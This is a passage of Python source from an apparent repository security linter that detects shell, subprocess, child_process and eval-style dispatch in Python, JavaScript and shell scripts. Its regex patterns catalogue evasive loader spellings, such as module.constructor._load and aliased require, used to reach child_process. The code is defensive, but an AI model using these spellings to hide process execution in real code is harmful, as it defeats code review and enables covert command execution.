                assignments.setdefault(target.id, []).append(node.value.id if isinstance(node.value, ast.Name) else None)
    changed = True
    while changed:
        changed = False
        for target, values in assignments.items():
            # Multiple, conditional, or dynamic writes taint an alias, but must
            # never erase its dispatch provenance and make calls disappear.
            if any(value in aliases for value in values) and target not in aliases:
                aliases.add(target); changed = True
    return aliases


def _resolved_python_process_callable(
    expression: ast.AST,
    scope: ast.AST,
    bindings: PythonBindings,
    modules: tuple[set[str], ...],
    import_module_calls: set[str],
    imported: dict[str, tuple[str, str]],
    seen: set[str] | None = None,
) -> tuple[str, str | None] | None:
    """Resolve proven process callables; ``None`` as the API means proven but dynamic."""
    seen = set() if seen is None else seen
    if isinstance(expression, ast.Name):
        if expression.id in imported:
            return imported[expression.id]
        value = _python_binding_value(bindings, scope, expression.id, expression)
        value_scope = scope
        locally_declared = expression.id in bindings.get(scope, {}) or (
            isinstance(scope, (ast.FunctionDef, ast.AsyncFunctionDef))
            and expression.id in _function_parameter_names(scope)
        )
        if value is None and not locally_declared:
            found, outer_value, outer_scope = _python_module_binding(bindings, expression.id)
            if found:
                value = outer_value
                value_scope = outer_scope if outer_scope is not None else scope
        if expression.id in seen or value is None:
            return None
        return _resolved_python_process_callable(
            value, value_scope, bindings, modules, import_module_calls,
            imported, seen | {expression.id},
        )

    def builtins_getattr(callable_expression: ast.AST) -> bool:
        if isinstance(callable_expression, ast.Name):
            if callable_expression.id == "getattr":
                locally_declared = callable_expression.id in bindings.get(scope, {}) or (
                    isinstance(scope, (ast.FunctionDef, ast.AsyncFunctionDef))
                    and callable_expression.id in _function_parameter_names(scope)
                )
                if locally_declared:
                    value = _python_binding_value(bindings, scope, callable_expression.id, callable_expression)
                    return (
                        isinstance(value, ast.ImportFrom) and value.module == "builtins"
                        and any(item.name == "getattr" for item in value.names)
                    )
                found, outer_value, _ = _python_module_binding(bindings, callable_expression.id)
                if not found:
                    return True
                return (
                    isinstance(outer_value, ast.ImportFrom) and outer_value.module == "builtins"
                    and any(item.name == "getattr" for item in outer_value.names)
                )
            value = _python_binding_value(bindings, scope, callable_expression.id, callable_expression)
            return value is not None and builtins_getattr(value)
        return (
            isinstance(callable_expression, ast.Attribute) and callable_expression.attr == "getattr"
            and _resolved_python_module(callable_expression.value, scope, bindings, modules, import_module_calls, seen) == "builtins"
        )

    module = None
    selected: ast.AST | None = None
    owner: ast.AST | None = None
    shadowed_getattr = False
    if isinstance(expression, ast.Attribute):
        owner = expression.value
        selected = ast.Constant(expression.attr)
        module = _resolved_python_module(
            expression.value, scope, bindings, modules, import_module_calls, seen
        )
    elif (
        isinstance(expression, ast.Call)
        and builtins_getattr(expression.func)
        and len(expression.args) >= 2
    ):
        owner = expression.args[0]
        selected = expression.args[1]
        module = _resolved_python_module(
            expression.args[0], scope, bindings, modules, import_module_calls, seen
        )
    elif (
        isinstance(expression, ast.Call)
        and isinstance(expression.func, ast.Name) and expression.func.id == "getattr"
        and len(expression.args) >= 2
    ):
        shadowed_getattr = True
        owner = expression.args[0]
        selected = expression.args[1]
    elif (
        isinstance(expression, ast.Subscript)
        and isinstance(expression.value, ast.Attribute)
        and expression.value.attr == "__dict__"
    ):
        owner = expression.value.value
        selected = expression.slice
        module = _resolved_python_module(
            expression.value.value, scope, bindings, modules, import_module_calls, seen
        )
    if module is None:
        process_names = (
            SUBPROCESS_CALLS | SUBPROCESS_SHELL_CALLS | OS_EXEC_CALLS | OS_SPAWN_CALLS
            | OS_SHELL_CALLS | ASYNCIO_EXEC_CALLS | ASYNCIO_SHELL_CALLS | PTY_SPAWN_CALLS
        )
        unresolved_owner = (
            isinstance(owner, ast.Name)
            and isinstance(scope, (ast.FunctionDef, ast.AsyncFunctionDef))
            and owner.id in _function_parameter_names(scope)
            and _python_binding_value(bindings, scope, owner.id, expression) is None
        )
        if (
            shadowed_getattr and isinstance(selected, ast.Constant)
            and isinstance(selected.value, str) and selected.value in process_names
        ):
            return "<dynamic>", selected.value
        if shadowed_getattr and selected is not None and not isinstance(selected, ast.Constant):
            return "<dynamic>", None
        if (
            unresolved_owner and isinstance(selected, ast.Constant)
            and isinstance(selected.value, str) and selected.value in process_names
        ):
            return "<dynamic>", selected.value
        if unresolved_owner and selected is not None and not isinstance(selected, ast.Constant):
            return "<dynamic>", None
        return None
    if isinstance(selected, ast.Constant) and isinstance(selected.value, str):
        return module, selected.value
    return module, None


def _python_dynamic_sink(node: ast.Call, scope: ast.AST, bindings, modules, import_module_calls) -> bool:
    """Recognize standard dynamic-code callables, including runtime dictionaries."""
    expression = node.func
    builtins_names = modules[4]

    def builtins_owner(owner: ast.AST) -> bool:
        if isinstance(owner, ast.Name):
            if owner.id in builtins_names:
                return True
            value = _python_binding_value(bindings, scope, owner.id, owner)
            return value is not None and builtins_owner(value)
        if isinstance(owner, ast.Attribute) and owner.attr == "__dict__":
            return builtins_owner(owner.value)
        if (isinstance(owner, ast.Call) and isinstance(owner.func, ast.Name)
                and owner.func.id == "vars" and len(owner.args) == 1):
            return builtins_owner(owner.args[0])
        if (isinstance(owner, ast.Subscript) and isinstance(owner.value, ast.Call)
                and isinstance(owner.value.func, ast.Name) and owner.value.func.id == "globals"
                and isinstance(owner.slice, ast.Constant) and owner.slice.value == "__builtins__"):
            return True
        return False

    def unresolved_owner(owner: ast.AST) -> bool:
        return (
            isinstance(owner, ast.Name)
            and owner.id not in builtins_names
            and isinstance(scope, (ast.FunctionDef, ast.AsyncFunctionDef))
            and owner.id in _function_parameter_names(scope)
            and _python_binding_value(bindings, scope, owner.id, expression) is None
        )

    dangerous = {"eval", "exec", "compile"}
    if isinstance(expression, ast.Name):
        return expression.id in dangerous
    if isinstance(expression, ast.Attribute):
        return expression.attr in dangerous and (
            builtins_owner(expression.value) or unresolved_owner(expression.value)
        )
    if isinstance(expression, ast.Subscript) and builtins_owner(expression.value):
        return not isinstance(expression.slice, ast.Constant) or expression.slice.value in dangerous
    if isinstance(expression, ast.Call) and len(expression.args) >= 2:
        is_getattr = isinstance(expression.func, ast.Name) and expression.func.id == "getattr"
        is_getattr |= isinstance(expression.func, ast.Attribute) and expression.func.attr == "getattr" and builtins_owner(expression.func.value)
        if is_getattr:
            member = expression.args[1]
            if builtins_owner(expression.args[0]):
                return not isinstance(member, ast.Constant) or member.value in dangerous
            return (
                unresolved_owner(expression.args[0]) and isinstance(member, ast.Constant)
                and member.value in dangerous
            )
    return False


def _javascript_first_argument(source: str, open_paren: int) -> tuple[str | None, int]:
    """Return a balanced first argument and the end of the call, without interpreting JS."""
    i = open_paren + 1
    while i < len(source) and source[i].isspace():
        i += 1
    start = i
    stack = [")"]
    quote = ""
    escaped = False
    while i < len(source):
        char = source[i]
        if escaped:
            escaped = False
        elif quote:
            if char == "\\":
                escaped = True
            elif char == quote:
                quote = ""
        elif char in "'\"`":
            quote = char
        elif char in "([{":
            stack.append({"(": ")", "[": "]", "{": "}"}[char])
        elif char == stack[-1]:
            stack.pop()
            if not stack:
                return source[start:i].strip() or None, i + 1
        elif char == "," and len(stack) == 1:
            first = source[start:i].strip()
            # Continue to the balanced call end so option inspection stays local.
            j = i + 1
            nested = 1
            inner_quote = ""
            inner_escaped = False
            while j < len(source) and nested:
                item = source[j]
                if inner_escaped:
                    inner_escaped = False
                elif inner_quote:
                    if item == "\\": inner_escaped = True
                    elif item == inner_quote: inner_quote = ""
                elif item in "'\"`": inner_quote = item
                elif item == "(": nested += 1
                elif item == ")": nested -= 1
                j += 1
            return first or None, j
        i += 1
    return None, len(source)


def _javascript_declaration_call_parens(source: str, names: set[str]) -> set[int]:
    """Locate name parentheses that introduce JS function or method declarations."""
    name_pattern = "|".join(re.escape(name) for name in sorted(names))
    declarations: set[int] = set()
    patterns = (
        rf"\bfunction\s+(?:{name_pattern})\s*(\()",
        rf"(?:^|[{{}};])\s*(?:async\s+)?(?:static\s+)?(?:get\s+|set\s+)?"
        rf"(?:{name_pattern})\s*(\()(?=[^)]*\)\s*{{)",
    )
    for pattern in patterns:
        declarations.update(match.start(1) for match in re.finditer(pattern, source, re.M))
    return declarations


def _is_ambient_process_head(value: str) -> bool:
    """Only manifest-pinned paths or the validated-path sentinel are trusted."""
    manifest_paths = {
        item["path"] for item in json.loads(MANIFEST.read_text())["executables"].values()
        if isinstance(item, dict) and isinstance(item.get("path"), str) and item.get("sha256")
    }
    return value != "/<validated-child>" and value not in manifest_paths


def direct_dispatch_violations(path: Path, text: str | None = None) -> list[str]:
    source = path.read_text() if text is None else text
    failures: list[str] = []
    first = source.splitlines()[0] if source.splitlines() else ""
    if first.startswith("#!") and "/usr/bin/env" in first:
        failures.append("env_shebang")
    if is_shell(path, source):
        allowed = {"/usr/bin/head", "/usr/bin/python3", "/usr/bin/printf", "$JQ", "$GH", "grep", "head", "mktemp", "rm", "tr"}
        if (
            _repo_relative_path(path) == "scripts/check-required-checks.sh"
            and hashlib.sha256(source.encode()).hexdigest() == POSITIONAL_WRAPPER_SHA256
        ):
            allowed |= REQUIRED_CHECKS_SHELL_DISPATCHES
        syntax = shell_syntax_failure(path, source)
        if syntax:
            failures.append(syntax)
        try:
            dispatches = shell_external_dispatches(path, source)
        except ShellScanError as exc:
            failures.append(f"unparsed_shell:{exc}")
            dispatches = set()
        for command in sorted(dispatches):
            if command not in allowed:
                failures.append(f"shell_dispatch:{command}")
        return failures
    if path.suffix in {".ts", ".js"}:
        source = _canonical_javascript_static_word_escapes(source)
        executable_source, lexical_executable = _javascript_lexical_views(source)
        # Canonicalize standard CommonJS loader syntax without changing offsets.
        def canonical_require(match: re.Match[str]) -> str:
            return "require" + " " * (len(match.group(0)) - len("require"))
        loader_spellings = (
            r"process\s*\.\s*mainModule\s*\.\s*require",
            r"(?:module|globalThis)\s*\.\s*require",
            r"module\s*(?:\?\.|\.)\s*constructor\s*(?:\?\.|\.)\s*_load",
            r"module\s*(?:\?\.|\.)\s*constructor\s*(?:\?\.)?\[\s*(['\"`])_load\1\s*\]",
            r"module\s*(?:\?\.)?\[\s*(['\"`])constructor\1\s*\]\s*(?:\?\.|\.)\s*_load",
            r"module\s*(?:\?\.)?\[\s*(['\"`])constructor\1\s*\]\s*(?:\?\.)?\[\s*(['\"`])_load\2\s*\]",
            r"(?:module|globalThis)\s*(?:\?\.)?\[\s*(['\"`])require\1\s*\]",
            r"\(\s*0\s*,\s*require\s*\)",
        )
        for spelling in loader_spellings:
            executable_source = re.sub(spelling, canonical_require, executable_source)
            lexical_executable = re.sub(spelling, canonical_require, lexical_executable)
        previous = None
        while previous != executable_source:
            previous = executable_source
            executable_source = re.sub(r"\(\s*require\s*\)", canonical_require, executable_source)
        executable_source = re.sub(r"\brequire\s*\?\.\s*(?=\()", canonical_require, executable_source)
        lexical_executable = re.sub(r"\brequire\s*\?\.\s*(?=\()", canonical_require, lexical_executable)
        bindings = _javascript_literal_bindings(executable_source)
        child_process_objects = {"child_process"}
        dynamic_child_process_objects: set[str] = set()
        process_apis = {"execFile", "execFileSync", "spawn", "spawnSync", "exec", "execSync"}
        imported_calls: dict[str, str | None] = {}
        require_names = {"require"}
        create_require_names = {
            match.group(1) or match.group(2) or "createRequire"
            for match in re.finditer(
                r"\bimport\s*(?:\{\s*createRequire(?:\s+as\s+([A-Za-z_$][\w$]*))?\s*\}|"
                r"createRequire\s+as\s+([A-Za-z_$][\w$]*))\s*from\s*['\"](?:node:)?module['\"]",
                executable_source,
            )
        }
        for match in re.finditer(
            r"\b(?:const|let|var)\s*\{\s*createRequire(?:\s*:\s*([A-Za-z_$][\w$]*))?\s*\}\s*=\s*"
            r"require\s*\(\s*['\"](?:node:)?module['\"]\s*\)", executable_source,
        ):
            create_require_names.add(match.group(1) or "createRequire")
        factory_pattern = "|".join(map(re.escape, sorted(create_require_names))) or "(?!)"
        for match in re.finditer(
            rf"\b(?:const|let|var)\s+([A-Za-z_$][\w$]*)\s*=\s*(?:{factory_pattern})\s*\(",
            executable_source,
        ):
            require_names.add(match.group(1))
        changed = True
        while changed:
            changed = False
            for match in re.finditer(r"\b(?:const|let|var)\s+([A-Za-z_$][\w$]*)\s*=\s*([A-Za-z_$][\w$]*)\s*;?", executable_source):
                if match.group(2) in require_names and match.group(1) not in require_names:
                    require_names.add(match.group(1)); changed = True
        loader_pattern = rf"(?:{'|'.join(map(re.escape, sorted(require_names)))})\s*\(|(?:await\s+)?import\s*\("
        wrapped_loader_head = rf"(?:{'|'.join(map(re.escape, sorted(require_names)))}|(?:await\s+)?import)\s*\("
        parenthesized_loaders = re.compile(
            rf"\(\s*{wrapped_loader_head}\s*['\"](?:node:)?child_process['\"]\s*\)\s*\)\s*(?:\.|\?\.|\[)"
        )
        indexed_loaders = re.compile(
            rf"\[\s*{wrapped_loader_head}\s*['\"](?:node:)?child_process['\"]\s*\)\s*\]\s*\[\s*([^\]]+)\s*\]\s*(?:\.|\?\.|\[)"
        )
        for match in parenthesized_loaders.finditer(executable_source):
            line = executable_source.count(chr(10), 0, match.start()) + 1
            failures.append(f"ambiguous_dispatch:{line}:wrapped_receiver")
        for match in indexed_loaders.finditer(executable_source):
            line = executable_source.count(chr(10), 0, match.start()) + 1
            if match.group(1).strip() != "0":
                failures.append(f"ambiguous_dispatch:{line}")
            else:
                failures.append(f"ambiguous_dispatch:{line}:wrapped_receiver")
        for match in re.finditer(
            rf"\b(?:const|let|var)\s+([A-Za-z_$][\w$]*)\s*=\s*(?:await\s+)?(?:{'|'.join(map(re.escape, sorted(require_names)))}|import)\s*\(\s*([^)]*)\)",
            executable_source,
        ):
            argument = match.group(2).strip()
            if re.fullmatch(r"(?:(['\"])(?:node:)?child_process\1|`(?:node:)?child_process`)", argument):
                child_process_objects.add(match.group(1))
            elif not re.fullmatch(r"(?:(['\"])[^'\"]+\1|`[^`$]*`)", argument):
                dynamic_child_process_objects.add(match.group(1)); child_process_objects.add(match.group(1))
        # Assignments after declarations are provenance changes, not additional
        # declarations.  Include their receivers in candidate scanning; the
        # source-order state check below decides which value is live at each call.
        loader_names_pattern = "|".join(map(re.escape, sorted(require_names)))
        for match in re.finditer(
            rf"(?<![\w$])([A-Za-z_$][\w$]*)\s*=\s*(?:await\s+)?(?:{loader_names_pattern}|import)\s*\(\s*([^)]*)\)",
            executable_source,
        ):
            argument = match.group(2).strip()
            if re.fullmatch(r"(?:(['\"])(?:node:)?child_process\1|`(?:node:)?child_process`)", argument):
                child_process_objects.add(match.group(1))
            elif not re.fullmatch(r"(?:(['\"])[^'\"]+\1|`[^`$]*`)", argument):
                child_process_objects.add(match.group(1)); dynamic_child_process_objects.add(match.group(1))
        changed = True
        while changed:
            changed = False
            for match in re.finditer(
                r"(?<![\w$])(?:const\s+|let\s+|var\s+)?([A-Za-z_$][\w$]*)\s*=\s*([A-Za-z_$][\w$]*)\s*(?:;|\n|$)",
                executable_source,
            ):
                if match.group(2) in child_process_objects and match.group(1) not in child_process_objects:
                    child_process_objects.add(match.group(1)); changed = True
                    if match.group(2) in dynamic_child_process_objects:
                        dynamic_child_process_objects.add(match.group(1))
        # Give immediate require/import objects stable placeholder names without shifting offsets.
        immediate = re.compile(
            rf"(?:await\s+)?(?:{'|'.join(map(re.escape, sorted(require_names)))}|import)"
            rf"\s*\(\s*([^)]*)\)(?=\s*(?:\.|\?\.|\[))"
        )
        immediate_replacements: list[tuple[int, int, str]] = []
        def loader_object(match: re.Match[str]) -> str:
            if not any(
                not character.isspace()
                for character in lexical_executable[match.start():match.end()]
            ):
                return match.group(0)
            argument = match.group(1).strip()
            name = "child_process" if re.fullmatch(r"(?:(['\"])(?:node:)?child_process\1|`(?:node:)?child_process`)", argument) else "dynamic_child"
            if name == "dynamic_child":
                dynamic_child_process_objects.add(name); child_process_objects.add(name)
            replacement = name + " " * max(0, len(match.group(0)) - len(name))
            immediate_replacements.append((match.start(), match.end(), replacement))
            return replacement
        executable_source = immediate.sub(loader_object, executable_source)
        lexical_chars = list(lexical_executable)
        for start, end, replacement in immediate_replacements:
            lexical_chars[start:end] = replacement
        # Static computed member names are syntax, not inert string content.
        for member in re.finditer(r"\[\s*(['\"`])[^'\"`]+\1\s*\]", executable_source):
            if not any(
                not character.isspace()
                for character in lexical_executable[member.start():member.end()]
            ):
                continue
            lexical_chars[member.start():member.end()] = executable_source[member.start():member.end()]
        lexical_executable = "".join(lexical_chars)
        for match in re.finditer(
            r"\b(?:const|let|var)\s+([A-Za-z_$][\w$]*)\s*=\s*require\s*\(\s*(?:['\"](?:node:)?child_process['\"]|`(?:node:)?child_process`)\s*\)",
            executable_source,
        ):
            child_process_objects.add(match.group(1))
        for match in re.finditer(
            r"(?:\b(?:const|let|var)\s*)?\(?\s*\{([^}]*)\}\s*=\s*require\s*\(\s*(?:['\"](?:node:)?child_process['\"]|`(?:node:)?child_process`)\s*\)",
            executable_source,
        ):
            for item in match.group(1).split(","):
                parts = [part.strip() for part in item.split(":", 1)]
                if parts[0] in process_apis:
                    imported_calls[parts[-1]] = parts[0]
        for match in re.finditer(
            r"\bimport\s+(?:\*\s+as\s+([A-Za-z_$][\w$]*)|\{([^}]*)\})\s+from\s+['\"](?:node:)?child_process['\"]",
            executable_source,
        ):
            if match.group(1):
                child_process_objects.add(match.group(1))
            else:
                for item in match.group(2).split(","):
                    parts = re.split(r"\s+as\s+", item.strip())
                    if parts and parts[0] in process_apis:
                        imported_calls[parts[-1]] = parts[0]
        # Retain recognition of established unqualified API spellings, except where
        # source-level declarations or bindings prove that the spelling is local.
        local_callables = {
            group
            for match in re.finditer(
                r"\bfunction\s+([A-Za-z_$][\w$]*)\s*\(|"
                r"\b(?:const|let|var)\s+([A-Za-z_$][\w$]*)\s*=\s*(?:async\s+)?(?:function\b|(?:\([^)]*\)|[A-Za-z_$][\w$]*)\s*=>)",
                executable_source,
            )
            for group in match.groups()
            if group
        }
        imported_calls.update({api: api for api in process_apis - local_callables})
        changed = True
        while changed:
            changed = False
            object_pattern = "|".join(re.escape(name) for name in sorted(child_process_objects))
            for match in re.finditer(
                rf"\b(?:const|let|var)\s+([A-Za-z_$][\w$]*)\s*=\s*({object_pattern})"
                rf"(?![\w$?.\[])\s*(?:;|\n|$)",
                executable_source,
            ):
                if match.group(1) not in child_process_objects:
                    child_process_objects.add(match.group(1))
                    if match.group(2) in dynamic_child_process_objects:
                        dynamic_child_process_objects.add(match.group(1))
                    changed = True
            object_pattern = "|".join(re.escape(name) for name in sorted(child_process_objects))
            for match in re.finditer(
                rf"(?<![\w$])(?:(?:const|let|var)\s+)?([A-Za-z_$][\w$]*)\s*=\s*\b({object_pattern})\s*(?:(?:\?\.|\.)\s*([A-Za-z_$][\w$]*)|(?:\?\.)?\[\s*(?:['\"]([^'\"]+)['\"]|([A-Za-z_$][\w$]*))\s*\])\s*;?",
                executable_source,
            ):
                alias = match.group(1)
                computed_name = match.group(5)
                api = match.group(3) or match.group(4) or bindings.get(computed_name or "")
                if alias not in imported_calls and (api in process_apis or computed_name):
                    imported_calls[alias] = api if api in process_apis else None
                    changed = True
            for match in re.finditer(
                rf"(?<![\w$])(?:(?:const|let|var)\s+)?([A-Za-z_$][\w$]*)\s*=\s*({'|'.join(re.escape(name) for name in sorted(imported_calls)) if imported_calls else '(?!)'})\s*;?",
                executable_source,
            ):
                if match.group(2) in imported_calls and match.group(1) not in imported_calls:
                    imported_calls[match.group(1)] = imported_calls[match.group(2)]; changed = True
        provenance_source = executable_source
        executable_source = lexical_executable

        process_object_pattern = "|".join(
            re.escape(candidate) for candidate in sorted(child_process_objects)
        )
        process_callable_pattern = "|".join(
            re.escape(candidate) for candidate in sorted(imported_calls)
        )
        process_api_pattern = "|".join(map(re.escape, sorted(process_apis)))
        container_values: list[str] = []
        if process_object_pattern:
            container_values.append(
                rf"\b(?:{process_object_pattern})\s*(?:\?\.)?\s*\.\s*"
                rf"(?:{process_api_pattern})\b"
            )
        if process_callable_pattern:
            container_values.append(
                rf"(?<![\w$])(?:{process_callable_pattern})(?![\w$])"
            )
        if container_values:
            container_value_pattern = "|".join(container_values)
            for match in re.finditer(
                rf"\[(?:(?!\]).)*(?:{container_value_pattern})(?:(?!\]).)*\]",
                executable_source,
                re.S,
            ):
                failures.append(
                    f"ambiguous_dispatch:{executable_source.count(chr(10), 0, match.start()) + 1}:process_callable_container"
                )
            object_container_values: list[str] = []
            if process_object_pattern:
                object_container_values.append(
                    rf"\b(?:{process_object_pattern})\s*(?:\?\.)?\s*\.\s*"
                    rf"(?:{process_api_pattern})\b"
                )
            if process_callable_pattern:
                object_container_values.append(
                    rf"(?:[:]\s*|\breturn\s+)(?:{process_callable_pattern})\b|"
                    rf"(?:^|[{{,]\s*)(?:{process_callable_pattern})\s*(?=[,}}])"
                )
            if object_container_values:
                object_container_value_pattern = "|".join(object_container_values)
                object_assignment_pattern = (
                    rf"\b(?:const|let|var)\s+[A-Za-z_$][\w$]*\s*=\s*"
                    rf"\{{(?:(?!\}}).)*(?:{object_container_value_pattern})(?:(?!\}}).)*\}}"
                )
                for match in re.finditer(object_assignment_pattern, executable_source, re.S):
                    failures.append(
                        f"ambiguous_dispatch:{executable_source.count(chr(10), 0, match.start()) + 1}:process_callable_container"
                    )

        # Normalize the two transparent receiver wrappers.  Anything other than
        # the exact zero index remains visible as an auditable dynamic receiver.
        wrapped_loader = re.compile(
            r"(?:\(\s*(child_process|dynamic_child)\s*\)|"
            r"\[\s*(child_process|dynamic_child)\s*\]\s*\[\s*([^\]]+)\s*\])\s*(?:\.|\?\.|\[)"
        )
        for match in wrapped_loader.finditer(provenance_source):
            index = match.group(3)
            line = provenance_source.count(chr(10), 0, match.start()) + 1
            if index is not None and index.strip() != "0":
                failures.append(f"ambiguous_dispatch:{line}")
            elif "child_process" in match.group(0):
                failures.append(f"ambiguous_dispatch:{line}:wrapped_receiver")

        # These APIs execute source text rather than an argv vector.  The call
        # itself is sufficient evidence even when the lexer correctly blanks its
        # string/template argument.
        dynamic_code_patterns = (
            r"(?<![.\w$])eval\s*(?:\?\.)?\s*\(",
            r"(?<![.\w$])(?:new\s+)?Function\s*\(",
            r"\bvm\s*(?:\?\.)?\.\s*(?:runInThisContext|runInNewContext|runInContext|Script)\s*\(",
            r"\bnew\s+(?:Worker|SharedWorker)\s*\(",
        )
        dynamic_declaration_parens = _javascript_declaration_call_parens(executable_source, {"eval", "Function"})
        for pattern in dynamic_code_patterns:
            for match in re.finditer(pattern, executable_source):
                if match.end() - 1 in dynamic_declaration_parens:
                    continue
                failures.append(f"dynamic_code:{provenance_source.count(chr(10), 0, match.start()) + 1}")
        sink_receivers = r"(?:globalThis|global|window|self|vm)"
        for match in re.finditer(
            rf"\b({sink_receivers})\s*(?:\?\.)?\[\s*(?:(['\"])([^'\"]+)\2|([^\]]+))\s*\]\s*(?:\?\.)?\s*\(",
            executable_source,
        ):
            receiver, constant, dynamic = match.group(1), match.group(3), match.group(4)
            supported = {"eval", "Function"} if receiver != "vm" else {"runInThisContext", "runInNewContext", "runInContext", "Script"}
            if dynamic is not None or constant in supported:
                failures.append(f"dynamic_code:{provenance_source.count(chr(10), 0, match.start()) + 1}")
        for match in re.finditer(r"\b(?:setTimeout|setInterval)\s*\(", executable_source):
            argument = provenance_source[match.end():].lstrip()
            if argument.startswith(("'", '"', "`")):
                failures.append(f"dynamic_code:{provenance_source.count(chr(10), 0, match.start()) + 1}")

        assignment_pattern = re.compile(
            r"(?:(?:const|let|var)\s+)?([A-Za-z_$][\w$]*)\s*=\s*([^;\n]+)"
        )
        # Discover provenance changes exclusively in the literal-free lexical
        # view.  The two views have identical offsets, so the RHS can then be
        # recovered from the comment-blanked original without allowing an ``=``
        # or ``;`` in a string, regex, or template-text segment to manufacture
        # an assignment.
        assignments = list(assignment_pattern.finditer(executable_source))
        local_classes = set(re.findall(r"\bclass\s+([A-Za-z_$][\w$]*)", executable_source))

        def receiver_state(name: str, position: int, seen: set[str] | None = None) -> str:
            """Resolve the last simple assignment before a call in source order."""
            seen = set() if seen is None else seen
            if name in seen:
                return "unknown"
            prior = [item for item in assignments if item.group(1) == name and item.start() < position]
            if not prior:
                if name in local_classes:
                    return "local"
                return "child" if name == "child_process" else "unknown"
            rhs = provenance_source[prior[-1].start(2):prior[-1].end(2)].strip()
            lexical_rhs = executable_source[prior[-1].start(2):prior[-1].end(2)].strip()
            if rhs.startswith("{"):
                process_object_pattern = "|".join(
                    re.escape(candidate) for candidate in sorted(child_process_objects)
                )
                if process_object_pattern and re.search(
                    rf"\b(?:{process_object_pattern})\s*(?:\?\.)?\s*(?:\.\s*)?"
                    rf"(?:{'|'.join(map(re.escape, sorted(process_apis)))})\b",
                    lexical_rhs,
                ):
                    return "unknown"
                process_callable_pattern = "|".join(
                    re.escape(candidate) for candidate in sorted(imported_calls)
                )
                if process_callable_pattern and re.search(
                    rf"(?:[:]\s*|\breturn\s+)(?:{process_callable_pattern})\b|"
                    rf"(?:^|[{{,]\s*)(?:{process_callable_pattern})\s*(?=[,}}])",
                    lexical_rhs,
                ):
                    return "unknown"
                return "local"
            if re.match(r"(?:class\b|(?:async\s+)?(?:function\b|(?:\([^)]*\)|[A-Za-z_$][\w$]*)\s*=>))", rhs):
                return "local"
            if re.match(rf"new\s+(?:{'|'.join(map(re.escape, sorted(local_classes))) or '(?!)'})\b", rhs):
                return "local"
            loader = re.match(rf"(?:await\s+)?(?:{loader_names_pattern}|import)\s*\(\s*([^)]*)\)", rhs)
            if loader:
                argument = loader.group(1).strip()
                if re.fullmatch(r"(['\"])(?:node:)?child_process\1", argument):
                    return "child"
                if re.fullmatch(r"(['\"])[^'\"]+\1", argument):
                    return "local"
                return "unknown"
            alias = re.fullmatch(r"([A-Za-z_$][\w$]*)", rhs)
            if alias:
                return receiver_state(alias.group(1), prior[-1].start(), seen | {name})
            return "unknown"
        object_pattern = "|".join(re.escape(name) for name in sorted(child_process_objects))
        call_pattern = "|".join(re.escape(name) for name in sorted(imported_calls))
        api_pattern = "|".join(re.escape(name) for name in sorted(process_apis))
        calls = re.compile(
            rf"(?:\b({object_pattern})\s*(?:\?\.)?\s*(?:\.\s*)?(?:"
            rf"([A-Za-z_$][\w$]*)|\[\s*(['\"])([^'\"]+)\3\s*\]|\[\s*([^\]]+)\s*\])"
            rf"|(?<![.\w$])({call_pattern}))\s*(?:\?\.)?\s*(\()",
            re.S,
        )
        declaration_parens = _javascript_declaration_call_parens(executable_source, process_apis)
        for match in calls.finditer(executable_source):
            if match.start(7) in declaration_parens:
                continue
            object_name, property_name, dynamic_property, alias = (
                match.group(1), match.group(2) or match.group(4), match.group(5), match.group(6)
            )
            live_state = receiver_state(object_name, match.start()) if object_name else "child"
            if object_name and live_state == "local":
                continue
            if alias and receiver_state(alias, match.start()) == "local":
                continue
            api = imported_calls[alias] if alias else property_name
            if object_name and dynamic_property:
                property_binding = dynamic_property.strip()
                api = bindings.get(property_binding) if re.fullmatch(r"[A-Za-z_$][\w$]*", property_binding) else None
            # A proven child_process object with a dynamic or unknown property is itself auditable.
            if live_state == "unknown" or object_name in dynamic_child_process_objects or object_name and api not in process_apis:
                api = None
            argument, call_end = _javascript_first_argument(provenance_source, match.start(7))
            variable = argument if argument and re.fullmatch(r"[A-Za-z_$][\w$]*", argument) else None
            value = ""
            if argument and len(argument) >= 2 and argument[0] == argument[-1] and argument[0] in "'\"":
                value = argument[1:-1]
            elif argument and argument.startswith("`") and argument.endswith("`") and "${" not in argument:
                value = argument[1:-1]
            elif variable:
                value = _javascript_literal_at(provenance_source, variable, match.start()) or ""
            line = executable_source.count(chr(10), 0, match.start()) + 1
            if api is None:
                failures.append(f"ambiguous_dispatch:{line}")
            elif api in {"exec", "execSync"}:
                failures.append(f"ambiguous_dispatch:{line}:shell_api")
            elif re.search(r"\bshell\s*:\s*true\b", provenance_source[match.end():call_end]):
                failures.append(f"ambiguous_dispatch:{line}:shell_true")
            elif value and _is_ambient_process_head(value):
                failures.append(f"bare_dispatch:{executable_source.count(chr(10), 0, match.start()) + 1}:{value}")
            elif not value and not (
                api == "execFileSync"
                and variable == "python"
                and _is_authenticated_broker_dispatch(path, executable_source, variable)
            ):
                failures.append(f"ambiguous_dispatch:{line}")
        # Process-like calls on unresolved receivers are security-relevant unless
        # the receiver is established locally as an object, class instance, or function.
        proven_local_receivers = {
            match.group(1)
            for match in re.finditer(
                r"\b(?:const|let|var)\s+([A-Za-z_$][\w$]*)\s*=\s*(?:\{|(?:async\s+)?(?:function\b|(?:\([^)]*\)|[A-Za-z_$][\w$]*)\s*=>))",
                executable_source,
            )
        }
        if local_classes:
            class_pattern = "|".join(map(re.escape, sorted(local_classes)))
            proven_local_receivers.update(
                match.group(1) for match in re.finditer(
                    rf"\b(?:const|let|var)\s+([A-Za-z_$][\w$]*)\s*=\s*new\s+(?:{class_pattern})\b",
                    executable_source,
                )
            )
            proven_local_receivers.update(local_classes)
        member_calls = re.compile(
            rf"\b([A-Za-z_$][\w$]*)\s*(?:\?\.)?\.\s*({api_pattern})\s*(?:\?\.)?\s*\("
        )
        for match in member_calls.finditer(executable_source):
            receiver = match.group(1)
            state = receiver_state(receiver, match.start())
            if state in {"child", "local"}:
                continue
            line = executable_source.count(chr(10), 0, match.start()) + 1
            marker = f"ambiguous_dispatch:{line}"
            if not any(item.startswith(marker) for item in failures):
                failures.append(marker)
        computed_calls = re.compile(
            rf"\b([A-Za-z_$][\w$]*)\s*(?:\?\.)?\[\s*(['\"])({api_pattern})\2\s*\]\s*(?:\?\.)?\s*\("
        )
        for match in computed_calls.finditer(executable_source):
            state = receiver_state(match.group(1), match.start())
            if state in {"child", "local"}:
                continue
            line = executable_source.count(chr(10), 0, match.start()) + 1
            marker = f"ambiguous_dispatch:{line}"
            if not any(item.startswith(marker) for item in failures):
                failures.append(marker)
        return failures
    try:
        tree = ast.parse(source)
    except SyntaxError as exc:
